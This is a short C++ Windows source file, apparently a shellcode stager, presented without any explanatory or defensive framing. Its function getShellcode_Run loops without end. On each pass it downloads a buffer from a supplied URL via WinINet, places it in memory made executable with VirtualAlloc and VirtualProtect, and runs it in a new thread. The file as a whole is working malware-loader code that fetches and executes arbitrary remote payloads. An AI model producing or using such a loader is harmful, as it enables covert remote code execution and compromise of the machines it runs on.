#include <iostream>
#include <iterator>
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet")

#define DEFAULT_BUFLEN 4096

#include "get_buf.h"

using namespace std;

int getShellcode_Run(const char* url) {
    while (true) {
        char recvbuf[DEFAULT_BUFLEN];
        get_buf(url, recvbuf);

        // custom
        LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(recvbuf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (!alloc_mem) {
            printf("Failed to Allocate memory (%u)\n", GetLastError());
            return -1;
        }
        
        MoveMemory(alloc_mem, recvbuf, sizeof(recvbuf));
        //RtlMoveMemory(alloc_mem, recvbuf, sizeof(recvbuf));


        DWORD oldProtect;

        if (!VirtualProtect(alloc_mem, sizeof(recvbuf), PAGE_EXECUTE_READ, &oldProtect)) {
            printf("Failed to change memory protection (%u)\n", GetLastError());
            return -2;
        }


        HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
        if (!tHandle) {
            printf("Failed to Create the thread (%u)\n", GetLastError());
            return -3;
        }
        
        printf("\n\nrecvbuf : %s\n", (char*)recvbuf);
        printf("alloc_mem : %p\n", alloc_mem);
        WaitForSingleObject(tHandle, INFINITE);
        //getchar();
        // or

        //((void(*)())alloc_mem)();

        Sleep(1000);
    }
}